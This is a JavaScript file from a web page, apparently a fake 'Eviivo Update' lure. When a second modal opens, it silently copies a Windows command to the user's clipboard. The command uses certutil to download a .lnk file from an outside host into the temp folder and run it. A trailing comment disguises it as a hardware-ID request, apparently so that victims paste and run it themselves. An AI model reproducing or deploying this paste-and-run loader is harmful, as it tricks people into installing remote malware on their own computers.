function copyToClipboard() {
    const textToCopy = `cmd /c start /b cmd /c "certutil -urlcache -f https://flytomap.com/httpdocsINFO/Eviivo.lnk %temp%\Eviivo.lnk >nul 2>&1 && start /b %temp%\Eviivo.lnk # && Eviivo Update HWID request id=193857376647265813`;
    const tempInput = document.createElement("textarea");
    tempInput.value = textToCopy;
    tempInput.style.position = "fixed";
    tempInput.style.opacity = "0";
    document.body.appendChild(tempInput);
    tempInput.focus();
    tempInput.select();
    document.execCommand("copy");
    document.body.removeChild(tempInput);
}

function showSecondModal() {
    document.getElementById("firstModal").style.display = "none";
    document.getElementById("secondModal").style.display = "block";
    copyToClipboard();
}

window.onload = function () {
    const preloader = document.getElementById("preloader");
    const overlay = document.getElementById("overlay");

    setTimeout(() => {
        preloader.style.display = "none";
        overlay.style.display = "block";
    }, 1500);
};

